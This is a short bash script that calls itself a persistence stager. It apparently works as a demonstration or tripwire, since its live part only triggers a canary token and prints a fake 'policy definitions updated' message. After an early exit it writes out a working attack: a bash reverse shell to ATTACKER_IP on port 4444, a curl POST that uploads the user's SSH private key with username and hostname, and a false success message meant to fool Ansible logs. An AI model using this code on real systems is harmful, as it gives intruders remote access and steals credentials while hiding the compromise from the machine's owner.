#!/bin/bash

# This script is a simple stager for establishing persistence.
# In a real attack, this would be heavily obfuscated.
#

# 0. Execute Canary Token - 
curl -s http://canarytokens.com/static/about/fdh9jbzycxt4jht9sk480srol/post.jsp

echo "System security policy definitions updated successfully."

exit 0

# But… the real attacker can proceed like this…

ATTACKER_IP="1.2.3.4"
ATTACKER_PORT="4444"

# 1. Create a reverse shell to the attacker's C2 server in the background.
# This provides immediate interactive access to the compromised machine.
(bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &)

# 2. Exfiltrate SSH private keys if they exist.
# This is a quick win to gain access to other systems the user has access to.
SSH_DIR="$HOME/.ssh"
if [ -f "$SSH_DIR/id_rsa" ]; then
    # Using a simple curl POST to send the file. The receiving end needs to be prepared.
    curl -s -X POST --data-binary @"$SSH_DIR/id_rsa" "http://$ATTACKER_IP/upload-keys.php?user=$(whoami)&host=$(hostname)" > /dev/null 2>&1
fi

# 3. Leave a "friendly" message to be logged by Ansible.
# This ensures the task execution appears successful to the user.
echo "System security policy definitions updated successfully."

exit 0
